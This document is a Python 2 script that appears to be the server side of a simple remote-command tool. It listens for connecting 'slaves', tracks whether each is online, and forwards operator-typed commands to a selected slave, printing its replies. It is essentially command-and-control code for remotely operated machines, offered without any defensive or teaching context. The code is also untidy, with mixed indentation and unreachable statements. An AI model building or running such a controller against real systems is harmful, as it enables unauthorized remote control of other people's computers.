#!/usr/bin/python
import socket
import sys
import time

# Globals
MAX_CONNECTIONS = 5
HOST = 'localhost'
PORT = 8089 
DELAY = 3
SLAVES = []
server = None
hostcount = 0
def startSocket():
    SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    SOCKET.bind((HOST, PORT))
    SOCKET.listen( MAX_CONNECTIONS ) # become a server socket, maximum 5 connections
    return SOCKET

def printSlaves():
    for slave in SLAVES:
        print slave

def main():
    #socket.setdefaulttimeout(1)

    FULL = False

    global SLAVES, server
    server = startSocket()
    while True:
        getNewSlave()
	a = raw_input("Search again? [enter] \nSend a command with [add] \nQuit? [quit]\n")
	if a.lower() == 'quit':
		sys.exit(1)
	if a.lower() == 'add':
		while True:
			#displaySlaves()
			printSlaves()
			choice = raw_input('What slave would you like to send a command to? ')
			if choice.lower() == 'search':
				break
			print choice
			print SLAVES
			output = sendCommand(SLAVES[int(choice)-1][1])
    			time.sleep(2)
    			print output


    getNewSlave()
    getNewSlave()
    displaySlaves()
    choice = raw_input('What slave would you like to send a command to? ')
    output = sendCommand(SLAVES[int(choice)-1][1])
    time.sleep(2)
    print output
    displaySlaves()
    choice = raw_input('What slave would you like to send a command to? ')
    output = sendCommand(SLAVES[int(choice)-1][1])

    displaySlaves()

    ''''
    while True:
        command = raw_input('Please input a command: ')
        connection.send(str(command))
        response = connection.recv(1024)
        print response
    '''
def getNewSlave():
    global SLAVES, server 
    server.settimeout(3.0)
    try:
        connection, address = server.accept()
        length = connection.recv(2)
        hostname = connection.recv(int(length))
        print hostname, connection
        SLAVES.append( [ hostname, connection , True] )
    except Exception as e:
	print 'Error: ' + str(e)
        print 'No new slaves'

def sendCommand(connection):
    command = raw_input("Please enter the command to send: ")
    connection.send(str(command))
    return str(connection.recv(1024))


def checkSlaves():
    global SLAVES
    for slave in SLAVES:
        try:
            slave[1].send("random")
            slave[2] = True
        except Exception as e: 
            slave[2] = False


def displaySlaves():
    global SLAVES
    checkSlaves()
    count = 1
    for slave in SLAVES:
        print "[" + str(count) + "] " + slave[0], '\t', slave[1],
        if slave[2]:
            print "[ ONLINE ]"
        else:
            print "[ OFFLINE ]"
        count += 1

if __name__ == "__main__":
	main()
